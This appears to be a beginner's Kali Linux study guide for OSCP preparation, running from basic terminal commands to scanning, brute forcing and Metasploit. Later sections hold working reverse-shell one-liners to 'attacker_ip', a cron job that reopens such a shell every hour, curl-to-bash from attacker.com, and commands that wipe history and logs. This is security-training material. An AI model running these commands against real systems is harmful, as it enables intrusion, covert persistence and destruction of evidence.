# 00 - Kali Linux Essential Commands: Your First Steps

---
title: "Kali Linux Essential Commands - Beginner's Guide"
parent: "[[03_Linux]]"
tags:
  - kali-linux
  - commands
  - terminal
  - beginner
  - oscp
  - cheatsheet
  - quick-reference
created: 2026-01-24
updated: 2026-01-24
---

> **Executive Summary**: Welcome to Kali Linux! This is your **first terminal session guide**. You've just installed Kali, opened the terminal, and now you're staring at a black screen with a blinking cursor. Don't panic! This comprehensive guide teaches you the essential commands every security professional needs, from basic navigation to reconnaissance tools. By the end, you'll be comfortable in the terminal and ready to start your OSCP journey. Think of this as your "Kali Linux survival guide" - the commands you'll use every single day.

---

## Table of Contents

1. [First Login: What Am I Looking At?](#1-first-login-what-am-i-looking-at)
2. [Basic Navigation Commands](#2-basic-navigation-commands)
3. [File Operations](#3-file-operations)
4. [Viewing and Editing Files](#4-viewing-and-editing-files)
5. [File Permissions](#5-file-permissions)
6. [User and System Information](#6-user-and-system-information)
7. [Process Management](#7-process-management)
8. [Network Commands](#8-network-commands)
9. [Package Management](#9-package-management)
10. [Information Gathering Tools](#10-information-gathering-tools)
11. [Scanning and Enumeration](#11-scanning-and-enumeration)
12. [Web Application Testing](#12-web-application-testing)
13. [Password Attacks](#13-password-attacks)
14. [Exploitation Frameworks](#14-exploitation-frameworks)
15. [Privilege Escalation Checks](#15-privilege-escalation-checks)
16. [File Transfer Methods](#16-file-transfer-methods)
17. [Shells and Reverse Shells](#17-shells-and-reverse-shells)
18. [Persistence](#18-persistence)
19. [Covering Tracks](#19-covering-tracks)
20. [Essential One-Liners](#20-essential-one-liners)
21. [Keyboard Shortcuts](#21-keyboard-shortcuts)
22. [Common Mistakes](#22-common-mistakes)
23. [Quick Reference Cheatsheet](#23-quick-reference-cheatsheet)
24. [Summary](#24-summary)

---

## 1. First Login: What Am I Looking At?

### 1.1 The Terminal Prompt (ABSOLUTE BEGINNER)

When you open a terminal in Kali, you see something like:

```
┌──(kali㉿kali)-[~]
└─$ _
```

**Breaking It Down**:
```
┌──(kali㉿kali)-[~]
│   │    │      │
│   │    │      └─ Current directory (~ = home)
│   │    └──────── Hostname (computer name)
│   └───────────── Username
│
└─$ _
  │ └─ Cursor (where you type)
  └─── Prompt symbol ($ = normal user, # = root)
```

**Examples**:
```bash
# Normal user in home directory
┌──(kali㉿kali)-[~]
└─$ 

# Root user in /tmp
┌──(root㉿kali)-[/tmp]
└─# 

# Normal user in /var/www/html
┌──(kali㉿kali)-[/var/www/html]
└─$ 
```

### 1.2 Root vs Regular User

**ABSOLUTE BEGINNER**:

```
$ = Regular user (kali)
  - Limited permissions
  - Can't modify system files
  - Need sudo for admin tasks

# = Root user (superuser)
  - Full system access
  - Can do ANYTHING (dangerous!)
  - No restrictions
```

**Become Root**:
```bash
# Method 1: Run single command as root
sudo ls /root

# Method 2: Become root (use carefully!)
sudo su -

# Check who you are
whoami
```

### 1.3 Getting Help

**ABSOLUTE BEGINNER**: Every command has a manual.

```bash
# View manual for a command
man ls
man nmap
man john

# Quick help
ls --help
nmap --help

# Search for commands
apropos "network scan"
```

**Navigation in man pages**:
- `Space` = Next page
- `b` = Previous page
- `/word` = Search for "word"
- `n` = Next search result
- `q` = Quit

---

## 2. Basic Navigation Commands

### 2.1 Where Am I? (pwd)

**Print Working Directory** - shows current location:

```bash
pwd

# Output:
/home/kali
```

### 2.2 List Files (ls)

**ABSOLUTE BEGINNER**: See what files are in current directory.

```bash
# Basic list
ls

# Long format (details)
ls -l

# Show hidden files (start with .)
ls -a

# Long format + hidden
ls -la

# Human-readable sizes
ls -lh

# Sort by modification time
ls -lt

# Reverse order
ls -lr
```

**Example Output**:
```bash
ls -la

# Output:
drwxr-xr-x 10 kali kali 4096 Jan 24 10:00 .
drwxr-xr-x  3 root root 4096 Jan 20 08:00 ..
-rw-r--r--  1 kali kali  220 Jan 20 08:00 .bash_logout
-rw-r--r--  1 kali kali 3526 Jan 20 08:00 .bashrc
drwxr-xr-x  3 kali kali 4096 Jan 22 15:30 Documents
drwxr-xr-x  2 kali kali 4096 Jan 22 15:30 Downloads
-rw-r--r--  1 kali kali  807 Jan 20 08:00 .profile
```

### 2.3 Change Directory (cd)

```bash
# Go to home directory
cd
cd ~

# Go to specific directory
cd /etc
cd /var/www/html

# Go up one level
cd ..

# Go up two levels
cd ../..

# Go to previous directory
cd -

# Go to root directory
cd /
```

**Examples**:
```bash
# You are in /home/kali
pwd
# Output: /home/kali

# Go to /etc
cd /etc
pwd
# Output: /etc

# Go back to home
cd ~
pwd
# Output: /home/kali
```

### 2.4 Tab Completion (CRITICAL SKILL!)

**ABSOLUTE BEGINNER**: Press `Tab` to auto-complete. This will save you HOURS!

```bash
# Type first few letters, then press Tab
cd Doc[Tab]
# Auto-completes to: cd Documents/

# List all options if multiple matches
cd D[Tab][Tab]
# Shows: Desktop/  Documents/  Downloads/

# Works with commands too
nma[Tab]
# Completes to: nmap
```

---

## 3. File Operations

### 3.1 Create Files and Directories

```bash
# Create empty file
touch file.txt

# Create directory
mkdir mydir

# Create nested directories
mkdir -p parent/child/grandchild

# Create multiple directories
mkdir dir1 dir2 dir3
```

### 3.2 Copy Files (cp)

```bash
# Copy file
cp file.txt backup.txt

# Copy directory (recursive)
cp -r sourcedir/ destdir/

# Copy with verbose output
cp -v file.txt backup.txt

# Copy and preserve permissions
cp -p file.txt backup.txt

# Copy multiple files to directory
cp file1.txt file2.txt file3.txt /destination/
```

### 3.3 Move/Rename (mv)

```bash
# Rename file
mv oldname.txt newname.txt

# Move file to directory
mv file.txt /destination/

# Move multiple files
mv file1.txt file2.txt /destination/

# Move directory
mv olddir/ newdir/
```

### 3.4 Delete Files (rm)

```bash
# Delete file
rm file.txt

# Delete without confirmation
rm -f file.txt

# Delete directory (recursive)
rm -r dirname/

# Delete directory without confirmation (DANGEROUS!)
rm -rf dirname/

# Delete with confirmation for each file
rm -i file.txt
```

**⚠️ WARNING**: `rm -rf /` deletes EVERYTHING! Be VERY careful!

### 3.5 Find Files

```bash
# Find by name
find / -name "passwords.txt" 2>/dev/null

# Find by extension
find /home -name "*.txt"

# Find by size (larger than 100MB)
find / -size +100M

# Find SUID files (privilege escalation!)
find / -perm -4000 2>/dev/null

# Find files modified in last 24 hours
find / -mtime -1

# Find and delete
find /tmp -name "*.tmp" -delete
```

### 3.6 Locate Files (Fast Find)

```bash
# Update database first
sudo updatedb

# Quick find
locate passwords.txt
locate *.conf

# Case-insensitive
locate -i PASSWORD
```

---

## 4. Viewing and Editing Files

### 4.1 View File Contents

```bash
# Print entire file
cat file.txt

# View with line numbers
cat -n file.txt

# View first 10 lines
head file.txt

# View first 20 lines
head -n 20 file.txt

# View last 10 lines
tail file.txt

# View last 20 lines
tail -n 20 file.txt

# Follow file (watch new lines added)
tail -f /var/log/syslog

# View file with pagination
less file.txt
more file.txt
```

### 4.2 Search in Files (grep)

**ABSOLUTE BEGINNER**: Find text in files.

```bash
# Search for word in file
grep "error" logfile.txt

# Case-insensitive search
grep -i "ERROR" logfile.txt

# Search recursively in directory
grep -r "password" /var/www/

# Show line numbers
grep -n "admin" users.txt

# Invert match (show lines NOT containing word)
grep -v "comment" file.txt

# Search multiple files
grep "config" *.conf

# Count matches
grep -c "failed" auth.log
```

**Examples**:
```bash
# Find failed SSH logins
grep "Failed password" /var/log/auth.log

# Find IP addresses in log
grep -oE '\b[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\b' access.log

# Find files containing "password" in /etc
grep -r "password" /etc/ 2>/dev/null
```

### 4.3 Text Editors

**Nano** (Easiest):
```bash
nano file.txt

# Bottom of screen shows shortcuts:
# ^X = Exit (Ctrl+X)
# ^O = Save (Ctrl+O)
# ^W = Search (Ctrl+W)
```

**Vim** (Powerful but complex):
```bash
vim file.txt

# Modes:
# i = Insert mode (type text)
# Esc = Command mode
# :w = Save
# :q = Quit
# :wq = Save and quit
# :q! = Quit without saving
```

---

## 5. File Permissions

### 5.1 Understanding Permissions

**ABSOLUTE BEGINNER**:

```bash
ls -l file.txt

# Output:
-rw-r--r-- 1 kali kali 1234 Jan 24 10:00 file.txt
│││││││││
│││││││││
│││└└└└└─ Other (everyone else): r-- (read only)
│││
││└──────── Group: r-- (read only)
││
│└────────── Owner: rw- (read, write)
│
└──────────── File type: - (regular file)
```

**Permission Types**:
```
r = Read (4)
w = Write (2)
x = Execute (1)
- = No permission (0)
```

**Examples**:
```
rwx = 7 (4+2+1)
rw- = 6 (4+2)
r-x = 5 (4+1)
r-- = 4
--- = 0
```

### 5.2 Change Permissions (chmod)

```bash
# Make file executable
chmod +x script.sh

# Remove execute permission
chmod -x script.sh

# Numeric mode (rwxr-xr-x = 755)
chmod 755 script.sh

# Owner: rwx, Group: rx, Other: rx
chmod 755 file.txt

# Owner: rw, Group: r, Other: r
chmod 644 file.txt

# Recursive (directory and contents)
chmod -R 755 directory/
```

**Common Permissions**:
```
777 = rwxrwxrwx (everyone can do everything) - DANGEROUS!
755 = rwxr-xr-x (owner: full, others: read+execute)
700 = rwx------ (owner only)
644 = rw-r--r-- (owner: rw, others: read)
600 = rw------- (owner: rw, others: nothing)
```

### 5.3 Change Owner (chown)

```bash
# Change owner
sudo chown alice file.txt

# Change owner and group
sudo chown alice:developers file.txt

# Recursive
sudo chown -R alice:developers directory/
```

---

## 6. User and System Information

### 6.1 Who Am I?

```bash
# Current username
whoami

# Detailed user info
id

# Current user's groups
groups

# All logged-in users
who

# Last logins
last
```

### 6.2 System Information

```bash
# Hostname
hostname

# OS version
cat /etc/os-release

# Kernel version
uname -a
uname -r

# CPU info
cat /proc/cpuinfo
lscpu

# Memory info
free -h

# Disk usage
df -h

# Disk usage of current directory
du -sh *

# System uptime
uptime
```

---

## 7. Process Management

### 7.1 View Processes

```bash
# All processes
ps aux

# Process tree
ps auxf

# Real-time process viewer
top
htop

# Search for process
ps aux | grep firefox

# Find by name
pgrep firefox
```

### 7.2 Kill Processes

```bash
# Kill by PID
kill 1234

# Force kill
kill -9 1234

# Kill by name
pkill firefox
killall firefox

# Kill all your processes matching name
killall -u kali firefox
```

---

## 8. Network Commands

### 8.1 Network Configuration

```bash
# Show IP address
ip addr
ip a

# Show specific interface
ip addr show eth0

# Old way (still works)
ifconfig

# Show routing table
ip route
route -n

# Show DNS servers
cat /etc/resolv.conf
```

### 8.2 Network Testing

```bash
# Ping host
ping google.com
ping -c 4 192.168.1.1

# Traceroute
traceroute google.com

# DNS lookup
nslookup google.com
dig google.com

# Test port connectivity
nc -zv 192.168.1.1 80
telnet 192.168.1.1 80
```

### 8.3 Network Connections

```bash
# Show listening ports
netstat -tulpn
ss -tulpn

# Show active connections
netstat -antp
ss -antp

# Show all sockets
ss -a
```

### 8.4 Download Files

```bash
# wget (save to disk)
wget http://example.com/file.txt

# wget (custom output name)
wget -O output.txt http://example.com/file.txt

# curl (display on screen)
curl http://example.com

# curl (save to file)
curl -o output.txt http://example.com/file.txt
curl -O http://example.com/file.txt
```

---

## 9. Package Management

### 9.1 APT (Kali Package Manager)

```bash
# Update package list
sudo apt update

# Upgrade installed packages
sudo apt upgrade

# Update + upgrade (full)
sudo apt full-upgrade

# Install package
sudo apt install nmap

# Remove package
sudo apt remove nmap

# Remove package and config files
sudo apt purge nmap

# Search for package
apt search "network scan"

# Show package info
apt show nmap

# Clean up
sudo apt autoremove
sudo apt autoclean
```

---

## 10. Information Gathering Tools

### 10.1 WHOIS

```bash
# Domain lookup
whois example.com

# IP lookup
whois 1.2.3.4
```

### 10.2 DNS Enumeration

```bash
# DNS lookup
nslookup example.com
dig example.com

# All records
dig example.com ANY

# MX records (mail)
dig example.com MX

# NS records (nameservers)
dig example.com NS

# Zone transfer (if allowed)
dig @ns1.example.com example.com AXFR

# Reverse lookup
dig -x 1.2.3.4
```

### 10.3 theHarvester

```bash
# Email harvesting
theHarvester -d example.com -b google

# Multiple sources
theHarvester -d example.com -b all
```

---

## 11. Scanning and Enumeration

### 11.1 Nmap (ESSENTIAL!)

**ABSOLUTE BEGINNER**: Network scanner - finds open ports and services.

```bash
# Basic scan
nmap 192.168.1.1

# Scan multiple hosts
nmap 192.168.1.1-254
nmap 192.168.1.0/24

# Quick scan (top 100 ports)
nmap -F 192.168.1.1

# Full port scan (all 65535 ports)
nmap -p- 192.168.1.1

# Specific ports
nmap -p 80,443,8080 192.168.1.1
nmap -p 1-1000 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Aggressive scan
nmap -A 192.168.1.1

# Script scan
nmap -sC 192.168.1.1
nmap --script=vuln 192.168.1.1

# Ping sweep (find live hosts)
nmap -sn 192.168.1.0/24

# UDP scan
nmap -sU 192.168.1.1

# Save output
nmap -oN output.txt 192.168.1.1
nmap -oX output.xml 192.168.1.1
nmap -oA output 192.168.1.1
```

**Common Nmap Combos**:
```bash
# Quick TCP scan
nmap -sV -sC -oA scan 192.168.1.1

# Full TCP scan
nmap -p- -sV -sC -oA fullscan 192.168.1.1

# Fast scan
nmap -T4 -F 192.168.1.1

# Stealth scan
nmap -sS -T2 192.168.1.1
```

### 11.2 Masscan (Fastest Port Scanner)

```bash
# Scan entire internet for port 80 (don't do this!)
masscan 0.0.0.0/0 -p80

# Scan subnet super fast
masscan 192.168.1.0/24 -p1-65535 --rate 10000
```

### 11.3 Netcat (Swiss Army Knife)

```bash
# Banner grab
nc 192.168.1.1 80
GET / HTTP/1.0

# Port scan
nc -zv 192.168.1.1 1-1000

# Listen on port
nc -lvnp 4444

# Connect to listener
nc 192.168.1.1 4444

# Transfer file
# Receiver:
nc -lvnp 4444 > received_file
# Sender:
nc 192.168.1.1 4444 < file_to_send
```

---

## 12. Web Application Testing

### 12.1 Nikto (Web Scanner)

```bash
# Basic scan
nikto -h http://example.com

# Scan specific port
nikto -h http://example.com:8080

# SSL scan
nikto -h https://example.com -ssl
```

### 12.2 Gobuster (Directory Brute Force)

```bash
# Directory brute force
gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt

# With extensions
gobuster dir -u http://example.com -w wordlist.txt -x php,html,txt

# DNS subdomain brute force
gobuster dns -d example.com -w /usr/share/wordlists/dnsmap.txt
```

### 12.3 Dirb

```bash
# Basic scan
dirb http://example.com

# With wordlist
dirb http://example.com /usr/share/wordlists/dirb/common.txt

# Save output
dirb http://example.com -o results.txt
```

### 12.4 WPScan (WordPress Scanner)

```bash
# Basic scan
wpscan --url http://example.com

# Enumerate users
wpscan --url http://example.com --enumerate u

# Enumerate plugins
wpscan --url http://example.com --enumerate p

# Enumerate themes
wpscan --url http://example.com --enumerate t

# Aggressive scan
wpscan --url http://example.com --enumerate ap,at,u
```

### 12.5 SQLMap

```bash
# Basic scan
sqlmap -u "http://example.com/page.php?id=1"

# With cookie
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# POST request
sqlmap -u "http://example.com/login.php" --data="user=admin&pass=test"

# List databases
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Dump database
sqlmap -u "http://example.com/page.php?id=1" -D database_name --dump
```

---

## 13. Password Attacks

### 13.1 Hydra (Network Login Brute Force)

```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.1

# FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.1

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:incorrect"

# Multiple users and passwords
hydra -L users.txt -P passwords.txt ssh://192.168.1.1
```

### 13.2 John the Ripper

```bash
# Crack /etc/shadow
sudo unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt

# With wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack ZIP password
zip2john file.zip > zip.hash
john zip.hash
```

### 13.3 Hashcat

```bash
# Crack MD5
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Crack SHA-512 (Linux shadow)
hashcat -m 1800 -a 0 hashes.txt rockyou.txt

# Brute force (mask attack)
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l
```

---

## 14. Exploitation Frameworks

### 14.1 Metasploit

```bash
# Start Metasploit
msfconsole

# Search for exploit
search apache
search smb

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set options
set RHOST 192.168.1.100
set LHOST 192.168.1.1

# Run exploit
exploit
run

# Background session
background

# List sessions
sessions -l

# Interact with session
sessions -i 1
```

### 14.2 SearchSploit

```bash
# Search exploits
searchsploit apache

# Search by version
searchsploit "apache 2.4.49"

# Copy exploit to current directory
searchsploit -m 12345

# View exploit path
searchsploit -p 12345
```

---

## 15. Privilege Escalation Checks

### 15.1 Linux Enumeration

```bash
# Kernel version
uname -a

# SUID binaries
find / -perm -4000 2>/dev/null

# Sudo permissions
sudo -l

# Writable directories
find / -writable -type d 2>/dev/null

# Running as root
ps aux | grep root

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
```

### 15.2 Automated Tools

**LinPEAS** (Download and run):
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**LinEnum**:
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

---

## 16. File Transfer Methods

### 16.1 Python HTTP Server

```bash
# Start web server on port 8000
python3 -m http.server 8000

# Custom port
python3 -m http.server 9000

# Download from target:
wget http://attacker_ip:8000/file.txt
curl http://attacker_ip:8000/file.txt -o file.txt
```

### 16.2 Netcat Transfer

```bash
# Sender (attacker):
nc -lvnp 4444 < file.txt

# Receiver (target):
nc attacker_ip 4444 > file.txt
```

### 16.3 SCP (Secure Copy)

```bash
# Copy to remote
scp file.txt user@192.168.1.1:/tmp/

# Copy from remote
scp user@192.168.1.1:/tmp/file.txt .

# Copy directory
scp -r directory/ user@192.168.1.1:/tmp/
```

---

## 17. Shells and Reverse Shells

### 17.1 Reverse Shell One-Liners

**Bash**:
```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

**Python**:
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Netcat**:
```bash
nc -e /bin/bash attacker_ip 4444
```

**Perl**:
```perl
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 17.2 Upgrade to TTY Shell

```bash
# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then:
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 18. Persistence

### 18.1 Add SSH Key

```bash
# Generate key (attacker)
ssh-keygen -t rsa

# Add to target
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### 18.2 Cron Job

```bash
# Add to crontab
crontab -e

# Add reverse shell every hour
0 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
```

---

## 19. Covering Tracks

### 19.1 Clear History

```bash
# Clear bash history
history -c
rm ~/.bash_history

# Disable history for session
unset HISTFILE
```

### 19.2 Clear Logs

```bash
# Clear auth log
echo "" > /var/log/auth.log

# Clear all logs (dangerous)
find /var/log -type f -exec sh -c 'cat /dev/null > {}' \;
```

---

## 20. Essential One-Liners

```bash
# Find all SUID files
find / -perm -4000 -type f 2>/dev/null

# Find writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Extract IPs from file
grep -oE '\b[0-9]{1,3}(\.[0-9]{1,3}){3}\b' file.txt

# Simple port scan
for port in {1..65535}; do timeout 1 bash -c "</dev/tcp/192.168.1.1/$port" && echo "$port open"; done 2>/dev/null

# Download and execute
curl http://attacker.com/script.sh | bash
wget -O - http://attacker.com/script.sh | bash

# Base64 encode/decode
echo "text" | base64
echo "dGV4dAo=" | base64 -d
```

---

## 21. Keyboard Shortcuts

```bash
Ctrl+C      # Kill current command
Ctrl+Z      # Suspend current command
Ctrl+D      # Exit shell / EOF
Ctrl+L      # Clear screen (same as 'clear')
Ctrl+R      # Reverse search history
Ctrl+A      # Go to beginning of line
Ctrl+E      # Go to end of line
Ctrl+U      # Delete from cursor to beginning
Ctrl+K      # Delete from cursor to end
Ctrl+W      # Delete word before cursor
Tab         # Auto-complete
Tab Tab     # Show all options
Up/Down     # Navigate command history
!!          # Repeat last command
!$          # Last argument of previous command
```

---

## 22. Common Mistakes

**Mistake 1**: Not using tab completion
**Fix**: Press Tab constantly!

**Mistake 2**: Running commands as root unnecessarily
**Fix**: Only use sudo when needed

**Mistake 3**: Not reading error messages
**Fix**: Scroll up and READ the error

**Mistake 4**: Forgetting to update before installing
**Fix**: Always `sudo apt update` first

**Mistake 5**: Not saving scan output
**Fix**: Use `-oA output` with nmap

---

## 23. Quick Reference Cheatsheet

```bash
# NAVIGATION
pwd                  # Where am I?
ls -la              # List all files
cd /path            # Change directory
cd ..               # Go up one level

# FILE OPERATIONS
touch file          # Create file
mkdir dir           # Create directory
cp src dst          # Copy
mv src dst          # Move/rename
rm file             # Delete file
rm -rf dir          # Delete directory

# VIEW FILES
cat file            # Display file
head file           # First 10 lines
tail file           # Last 10 lines
less file           # Page through file
grep "text" file    # Search in file

# PERMISSIONS
chmod +x file       # Make executable
chmod 644 file      # rw-r--r--
chmod 755 file      # rwxr-xr-x

# NETWORK
ip addr             # IP address
ping host           # Test connectivity
nc -lvnp 4444       # Listen on port
wget url            # Download file

# SCANNING
nmap -sV host       # Version scan
nmap -p- host       # All ports
gobuster dir -u url -w wordlist  # Dir brute force

# PASSWORDS
john hashes.txt     # Crack passwords
hydra -l user -P pass.txt ssh://host  # Brute force

# PRIVILEGE ESCALATION
sudo -l             # Check sudo
find / -perm -4000  # Find SUID

# HELP
man command         # Manual
command --help      # Quick help
```

---

## 24. Summary

**You've Learned**:
- ✅ Terminal basics and navigation
- ✅ File operations and permissions
- ✅ Network commands
- ✅ Scanning and enumeration (nmap, gobuster)
- ✅ Web application testing (nikto, sqlmap)
- ✅ Password attacks (john, hydra, hashcat)
- ✅ Metasploit basics
- ✅ File transfer methods
- ✅ Reverse shells
- ✅ Privilege escalation checks

**Next Steps**:
1. Practice EVERY command
2. Set up a home lab
3. Try HackTheBox or TryHackMe
4. Build your own cheatsheet
5. Learn one new command every day

**Remember**: The terminal is your best friend. The more you use it, the more powerful you become!

---


